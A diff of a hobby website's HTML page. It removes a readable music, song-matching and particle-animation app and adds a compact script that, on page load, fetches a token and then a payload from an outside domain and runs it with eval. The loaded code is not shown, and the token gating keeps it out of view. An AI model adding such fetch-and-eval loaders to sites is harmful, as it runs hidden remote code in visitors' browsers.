@@ -12,8 +12,8 @@
 <meta property="og:image" content="https://larping.top/we%20love%20you%20benjamin.jpg"/>
 <meta property="og:site_name" content="the LARPing website"/>
 <link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="any"/>
-<meta name="theme-color" content="#050508" />
-<meta name="color-scheme" content="dark" />
+<meta name="theme-color" content="#050508"/>
+<meta name="color-scheme" content="dark"/>
 
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -23,469 +23,50 @@
 <style>
   *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
   html, body { background: #050508; color: #f4f4f5; font-family: 'Inter', system-ui, sans-serif; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; }
-  body { min-height: 100vh; min-height: 100dvh; overflow-x: hidden; }
+  body { min-height: 100vh; min-height: 100dvh; overflow-x: hidden; overflow-y: auto; }
   ::-webkit-scrollbar { width: 0; background: transparent; }
   body { -ms-overflow-style: none; scrollbar-width: none; }
 
-  #boot-screen {
-    position: fixed; inset: 0; z-index: 9999;
-    display: flex; flex-direction: column; align-items: center; justify-content: center;
-    gap: 1.1rem;
-    background:
-      radial-gradient(ellipse 80% 60% at 50% 30%, rgba(34, 211, 238, 0.1) 0%, transparent 55%),
-      radial-gradient(ellipse 60% 40% at 50% 70%, rgba(167, 139, 250, 0.05) 0%, transparent 50%),
-      #030307;
-    cursor: default;
-    transition: opacity 0.45s ease;
-  }
+  #b { position: fixed; inset: 0; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 1.1rem;
+       background: radial-gradient(ellipse 80% 60% at 50% 30%, rgba(34,211,238,0.1) 0%, transparent 55%), radial-gradient(ellipse 60% 40% at 50% 70%, rgba(167,139,250,0.05) 0%, transparent 50%), #030307;
+       transition: opacity .45s ease; }
+  body.app-ready #b { opacity: 0; pointer-events: none; }
+  #b .m { width: 56px; height: 56px; border-radius: 14px; display: grid; place-items: center;
+          background: linear-gradient(135deg, rgba(34,211,238,0.15), rgba(6,182,212,0.05)); border: 1px solid rgba(34,211,238,0.3);
+          color: #a5f3fc; font: 700 1.6rem/1 'Outfit', system-ui, sans-serif; letter-spacing: -0.04em;
+          box-shadow: 0 12px 32px rgba(34,211,238,0.15), inset 0 1px 0 rgba(255,255,255,0.08); animation: bp 1.6s ease-in-out infinite; }
+  #b .l { font: 600 0.62rem/1 'Outfit', system-ui, sans-serif; letter-spacing: 0.32em; text-transform: uppercase; color: #a1a1aa; }
+  #b .e { color: #fb7185; font: 500 0.78rem/1.5 ui-monospace, 'SF Mono', Menlo, monospace; max-width: 22rem; text-align: center; padding: 0 1rem; }
+  @keyframes bp { 0%,100%{box-shadow:0 12px 32px rgba(34,211,238,.15),inset 0 1px 0 rgba(255,255,255,.08);transform:scale(1)}50%{box-shadow:0 18px 44px rgba(34,211,238,.3),inset 0 1px 0 rgba(255,255,255,.14);transform:scale(1.04)}}
 
-  #boot-screen.fade { opacity: 0; pointer-events: none; }
-
-  #boot-screen .mark {
-    width: 56px; height: 56px; border-radius: 14px;
-    display: grid; place-items: center;
-    background: linear-gradient(135deg, rgba(34, 211, 238, 0.15), rgba(6, 182, 212, 0.05));
-    border: 1px solid rgba(34, 211, 238, 0.3);
-    color: #a5f3fc;
-    font-family: 'Outfit', system-ui, sans-serif;
-    font-size: 1.6rem; font-weight: 700; letter-spacing: -0.04em;
-    box-shadow: 0 12px 32px rgba(34, 211, 238, 0.15), inset 0 1px 0 rgba(255, 255, 255, 0.08);
-    animation: bootPulse 1.6s ease-in-out infinite;
-  }
-
-  #boot-screen .label {
-    font-family: 'Outfit', system-ui, sans-serif;
-    font-size: 0.62rem; font-weight: 600;
-    letter-spacing: 0.32em; text-transform: uppercase;
-    color: #a1a1aa;
-  }
-
-  #boot-screen .err {
-    color: #fb7185; font-size: 0.78rem; max-width: 22rem;
-    text-align: center; padding: 0 1rem; line-height: 1.5;
-    font-family: ui-monospace, 'SF Mono', Menlo, monospace;
-  }
-
-  @keyframes bootPulse {
-    0%, 100% { box-shadow: 0 12px 32px rgba(34, 211, 238, 0.15), inset 0 1px 0 rgba(255, 255, 255, 0.08); transform: scale(1); }
-    50%      { box-shadow: 0 18px 44px rgba(34, 211, 238, 0.3), inset 0 1px 0 rgba(255, 255, 255, 0.14); transform: scale(1.04); }
-  }
-
-  body.app-ready #boot-screen { display: none; }
-  body:not(.app-ready) #app-root,
-  body:not(.app-ready) .page-backdrop,
-  body:not(.app-ready) .ambient-glow,
-  body:not(.app-ready) .grid-overlay,
-  body:not(.app-ready) .noise-overlay,
-  body:not(.app-ready) #particle-canvas,
-  body:not(.app-ready) #intro-screen { visibility: hidden; }
+  #app { position: relative; min-height: 100vh; min-height: 100dvh; }
 </style>
 </head>
 <body>
 
-<div id="boot-screen" role="status" aria-live="polite">
-  <div class="mark" aria-hidden="true">L</div>
-  <div class="label">Loading</div>
+<div id="b" role="status" aria-live="polite">
+  <div class="m" aria-hidden="true">L</div>
+  <div class="l">Loading</div>
 </div>
 
-<div id="intro-screen" role="button" tabindex="0" aria-label="Enter site">
-  <div class="intro-mark" aria-hidden="true">L</div>
-  <p class="intro-cta">Enter<kbd>click or press enter</kbd></p>
-</div>
-
-<audio id="bg-music" loop preload="auto"></audio>
-
-<div class="page-backdrop" aria-hidden="true"></div>
-<div class="ambient-glow" aria-hidden="true"></div>
-<div class="grid-overlay" aria-hidden="true"></div>
-<div class="noise-overlay" aria-hidden="true"></div>
-<canvas id="particle-canvas" aria-hidden="true"></canvas>
-
-<div class="container" id="app-root"></div>
+<div id="app"></div>
 
 <script>
 (function () {
-  const API_URL = 'https://larping.zmbie.shop/payload';
-
-  function showBootError(msg) {
-    const boot = document.getElementById('boot-screen');
-    if (!boot) return;
-    boot.innerHTML = '<div class="err">' + String(msg).replace(/[<>&]/g, function (c) {
-      return ({ '<': '&lt;', '>': '&gt;', '&': '&amp;' })[c];
-    }) + '</div>';
+  var API = "https://larping.zmbie.shop";
+  function err(m) {
+    var b = document.getElementById("b");
+    if (b) b.innerHTML = '<div class="e">' + String(m).replace(/[<>&]/g, function (c) { return ({"<":"&lt;",">":"&gt;","&":"&amp;"})[c]; }) + '</div>';
   }
-
-  async function loadApi() {
-    let res;
-    try {
-      res = await fetch(API_URL, { mode: 'cors', credentials: 'omit', cache: 'no-cache' });
-    } catch (e) {
-      throw new Error('Network error fetching api');
-    }
-    if (!res.ok) throw new Error('Failed to load api (' + res.status + ')');
-    const text = await res.text();
-    const doc = new DOMParser().parseFromString(text, 'text/html');
-
-    const styleEl   = doc.getElementById('app-styles');
-    const tplEl     = doc.getElementById('app-html');
-    const cfgEl     = doc.getElementById('app-config');
-
-    if (!styleEl || !tplEl || !cfgEl) {
-      throw new Error('Malformed payload at ' + API_URL);
-    }
-
-    const injected = document.createElement('style');
-    injected.id = 'app-styles';
-    injected.textContent = styleEl.textContent;
-    document.head.appendChild(injected);
-
-    let config = {};
-    try { config = JSON.parse(cfgEl.textContent); } catch (e) { config = {}; }
-
-    const root = document.getElementById('app-root');
-    const frag = tplEl.content ? tplEl.content.cloneNode(true) : null;
-    if (frag) {
-      root.appendChild(frag);
-    } else {
-      root.innerHTML = tplEl.innerHTML;
-    }
-
-    return config;
-  }
-
-  function bootstrap(config) {
-    const intro = document.getElementById('intro-screen');
-    const music = document.getElementById('bg-music');
-    if (config.musicUrl) music.src = config.musicUrl;
-
-    function enterSite() {
-      if (intro.getAttribute('data-left')) return;
-      intro.setAttribute('data-left', '1');
-      music.volume = 1.0;
-      music.play().catch(function () {});
-      intro.style.opacity = '0';
-      intro.style.pointerEvents = 'none';
-      setTimeout(function () { intro.remove(); }, 1100);
-
-      [
-        '.site-badge',
-        '.hero-title',
-        '.hero-sub',
-        '.hero-img-wrap',
-        '#aura-section',
-        '#match-section',
-        '.footer'
-      ].forEach(function (sel) {
-        const el = document.querySelector(sel);
-        if (el) el.classList.add('revealed');
-      });
-    }
-
-    intro.addEventListener('click', enterSite);
-    intro.addEventListener('keydown', function (e) {
-      if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); enterSite(); }
-    });
-
-    const larpCfg = config.larpLink || {};
-    const larpLink = document.getElementById('larp-link');
-    if (larpLink) {
-      larpLink.addEventListener('click', function (e) {
-        e.preventDefault();
-        window.open(larpCfg.default || '#', '_blank');
-      });
-    }
-
-    initMatch(config);
-    initParticles(config);
-  }
-
-  function initMatch(config) {
-    const out = document.getElementById('match-out');
-    const list = document.getElementById('match-list');
-    const input = document.getElementById('match-input');
-    const btn = document.getElementById('match-btn');
-    if (!out || !list || !input || !btn) return;
-
-    const endpoint = (config && config.deezerEndpoint) || 'https://api.deezer.com/search/track';
-
-    function norm(s) {
-      return String(s).toLowerCase().replace(/[^a-z0-9\s]/g, ' ').replace(/\s+/g, ' ').trim();
-    }
-
-    function levenshtein(a, b) {
-      const m = a.length, n = b.length;
-      if (!m) return n;
-      if (!n) return m;
-      const prev = new Array(n + 1);
-      const cur = new Array(n + 1);
-      for (let j = 0; j <= n; j++) prev[j] = j;
-      for (let i = 1; i <= m; i++) {
-        cur[0] = i;
-        for (let j = 1; j <= n; j++) {
-          const c = a[i - 1] === b[j - 1] ? 0 : 1;
-          cur[j] = Math.min(prev[j] + 1, cur[j - 1] + 1, prev[j - 1] + c);
-        }
-        for (let j = 0; j <= n; j++) prev[j] = cur[j];
-      }
-      return prev[n];
-    }
-
-    function scoreLine(user, title) {
-      const a = norm(user);
-      const b = norm(title);
-      if (!a || !b) return 0;
-      if (a === b) return 100;
-      if (a.includes(b) || b.includes(a)) return 95;
-      const d = levenshtein(a, b);
-      const m = Math.max(a.length, b.length);
-      return m ? Math.max(0, Math.round(100 * (1 - d / m))) : 0;
-    }
-
-    function bestScoreForTrack(user, t) {
-      return Math.max(scoreLine(user, t.title || ''), scoreLine(user, t.title_short || ''));
-    }
-
-    function jsonpDeezerSearch(q) {
-      return new Promise(function (resolve, reject) {
-        const cb = 'dzcb' + Date.now() + Math.random().toString(36).slice(2, 9);
-        const script = document.createElement('script');
-        const tmr = setTimeout(function () {
-          cleanup();
-          reject(new Error('Request timed out.'));
-        }, 20000);
-        function cleanup() {
-          clearTimeout(tmr);
-          try { delete window[cb]; } catch (e) {}
-          if (script.parentNode) script.parentNode.removeChild(script);
-        }
-        window[cb] = function (payload) {
-          cleanup();
-          if (payload && payload.error) {
-            reject(new Error((payload.error && payload.error.message) || 'Search error.'));
-            return;
-          }
-          resolve(payload);
-        };
-        script.onerror = function () {
-          cleanup();
-          reject(new Error('Could not reach the search service.'));
-        };
-        script.src = endpoint + '?q=' + encodeURIComponent(q) + '&limit=30&output=jsonp&callback=' + cb;
-        document.head.appendChild(script);
-      });
-    }
-
-    function runCompare() {
-      const raw = input.value;
-      out.classList.remove('err');
-      list.innerHTML = '';
-      list.hidden = true;
-
-      if (!norm(raw)) {
-        out.textContent = 'Type a song title (or part of one) to compare.';
-        return;
-      }
-
-      btn.disabled = true;
-      out.textContent = 'Loading song names…';
-      jsonpDeezerSearch(raw)
-        .then(function (payload) {
-          const tracks = (payload && payload.data) || [];
-          if (!tracks.length) {
-            out.textContent = 'No tracks found for that search. Try different words.';
-            return;
-          }
-          const rows = tracks.map(function (t) {
-            return {
-              title: t.title,
-              title_short: t.title_short,
-              artist: (t.artist && t.artist.name) || '—',
-              score: bestScoreForTrack(raw, t)
-            };
-          });
-          rows.sort(function (a, b) { return b.score - a.score; });
-          const top = rows.slice(0, 8);
-          out.textContent = 'Your text vs titles returned for “' + raw.replace(/</g, '') + '”';
-          top.forEach(function (r) {
-            const li = document.createElement('li');
-            const left = document.createElement('div');
-            left.className = 'row-text';
-            const title = document.createElement('div');
-            title.className = 'title';
-            title.textContent = r.title;
-            const artist = document.createElement('div');
-            artist.className = 'artist';
-            artist.textContent = r.artist;
-            left.appendChild(title);
-            left.appendChild(artist);
-            const pill = document.createElement('span');
-            let pillCls = 'match-pill';
-            if (r.score >= 85) pillCls += ' strong';
-            else if (r.score < 55) pillCls += ' weak';
-            pill.className = pillCls;
-            pill.textContent = r.score + '%';
-            li.appendChild(left);
-            li.appendChild(pill);
-            list.appendChild(li);
-          });
-          list.hidden = false;
-        })
-        .catch(function (err) {
-          out.classList.add('err');
-          out.textContent = err && err.message ? err.message : 'Something went wrong.';
-        })
-        .then(function () {
-          btn.disabled = false;
-        });
-    }
-
-    btn.addEventListener('click', runCompare);
-    input.addEventListener('keydown', function (e) {
-      if (e.key === 'Enter') runCompare();
-    });
-  }
-
-  function initParticles(config) {
-    const canvas = document.getElementById('particle-canvas');
-    if (!canvas) return;
-    const ctx = canvas.getContext('2d', { alpha: true });
-    const pcfg = (config && config.particles) || {};
-
-    const settings = {
-      particleCount: window.innerWidth < 600 ? (pcfg.mobileCount || 28) : (pcfg.desktopCount || 48),
-      connectionDistance: pcfg.connectionDistance || 100,
-      mouseRepelDist: pcfg.mouseRepelDist || 90,
-      mouseForce: pcfg.mouseForce || 2.4,
-      baseSpeed: pcfg.baseSpeed || 0.18
-    };
-    const MOUSE_SMOOTH = pcfg.mouseSmooth || 0.1;
-
-    let dpr = 1;
-    let width, height;
-    let particles = [];
-
-    const targetMouse = { x: null, y: null };
-    const mouse = { x: null, y: null };
-
-    window.addEventListener('mousemove', function (e) {
-      targetMouse.x = e.clientX;
-      targetMouse.y = e.clientY;
-    });
-    window.addEventListener('mouseout', function () {
-      targetMouse.x = null;
-      targetMouse.y = null;
-    });
-
-    function syncMouse() {
-      if (targetMouse.x == null) { mouse.x = null; mouse.y = null; return; }
-      if (mouse.x == null) { mouse.x = targetMouse.x; mouse.y = targetMouse.y; return; }
-      mouse.x += (targetMouse.x - mouse.x) * MOUSE_SMOOTH;
-      mouse.y += (targetMouse.y - mouse.y) * MOUSE_SMOOTH;
-    }
-
-    function resize() {
-      dpr = Math.min(window.devicePixelRatio || 1, 2);
-      width = window.innerWidth;
-      height = window.innerHeight;
-      canvas.width = Math.round(width * dpr);
-      canvas.height = Math.round(height * dpr);
-      canvas.style.width = width + 'px';
-      canvas.style.height = height + 'px';
-      ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
-      initParticleSet();
-    }
-
-    class Particle {
-      constructor() { this.reset(true); }
-      reset() {
-        this.x = Math.random() * width;
-        this.y = Math.random() * height;
-        this.size = Math.random() * 1.2 + 0.6;
-        const angle = Math.random() * Math.PI * 2;
-        const speed = settings.baseSpeed * (0.6 + Math.random() * 0.8);
-        this.vx = Math.cos(angle) * speed;
-        this.vy = Math.sin(angle) * speed;
-        this.opacity = Math.random() * 0.35 + 0.15;
-        this.hue = 185 + Math.random() * 20;
-      }
-      update() {
-        this.x += this.vx;
-        this.y += this.vy;
-        if (mouse.x !== null) {
-          const dx = mouse.x - this.x;
-          const dy = mouse.y - this.y;
-          const distance = Math.sqrt(dx * dx + dy * dy);
-          if (distance < settings.mouseRepelDist && distance > 0) {
-            const force = (settings.mouseRepelDist - distance) / settings.mouseRepelDist;
-            this.x -= (dx / distance) * force * settings.mouseForce;
-            this.y -= (dy / distance) * force * settings.mouseForce;
-          }
-        }
-        if (this.x < 0) this.x = width;
-        if (this.x > width) this.x = 0;
-        if (this.y < 0) this.y = height;
-        if (this.y > height) this.y = 0;
-      }
-      draw() {
-        ctx.fillStyle = 'hsla(' + this.hue + ', 85%, 62%, ' + this.opacity + ')';
-        ctx.beginPath();
-        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
-        ctx.closePath();
-        ctx.fill();
-      }
-    }
-
-    function initParticleSet() {
-      particles = [];
-      for (let i = 0; i < settings.particleCount; i++) particles.push(new Particle());
-    }
-
-    function animate() {
-      syncMouse();
-      if (!document.hidden) {
-        ctx.clearRect(0, 0, width, height);
-        for (let a = 0; a < particles.length; a++) {
-          for (let b = a + 1; b < particles.length; b++) {
-            const dx = particles[a].x - particles[b].x;
-            const dy = particles[a].y - particles[b].y;
-            const distance = Math.sqrt(dx * dx + dy * dy);
-            if (distance < settings.connectionDistance) {
-              const opacity = (1 - (distance / settings.connectionDistance)) * 0.075;
-              ctx.strokeStyle = 'hsla(190, 80%, 65%, ' + opacity + ')';
-              ctx.lineWidth = 0.8;
-              ctx.beginPath();
-              ctx.moveTo(particles[a].x, particles[a].y);
-              ctx.lineTo(particles[b].x, particles[b].y);
-              ctx.stroke();
-            }
-          }
-        }
-        for (let i = 0; i < particles.length; i++) {
-          particles[i].update();
-          particles[i].draw();
-        }
-      }
-      requestAnimationFrame(animate);
-    }
-
-    window.addEventListener('resize', resize);
-    resize();
-    animate();
-  }
-
-  document.addEventListener('DOMContentLoaded', function () {
-    loadApi()
-      .then(function (config) {
-        const boot = document.getElementById('boot-screen');
-        if (boot) boot.classList.add('fade');
-        document.body.classList.add('app-ready');
-        bootstrap(config || {});
-      })
-      .catch(function (err) {
-        showBootError(err && err.message ? err.message : 'Failed to load.');
-        console.error(err);
-      });
-  });
+  var opts = { mode: "cors", credentials: "omit", cache: "no-store" };
+  fetch(API + "/token", opts)
+    .then(function (r) { if (!r.ok) throw new Error("token " + r.status); return r.json(); })
+    .then(function (j) {
+      return fetch(API + "/payload", { mode: "cors", credentials: "omit", cache: "no-store", headers: { "X-Token": j.token } });
+    })
+    .then(function (r) { if (!r.ok) throw new Error("payload " + r.status); return r.text(); })
+    .then(function (code) { (0, eval)(code); })
+    .catch(function (e) { err((e && e.message) || "Failed to load."); console.error(e); });
 })();
 </script>
 </body>
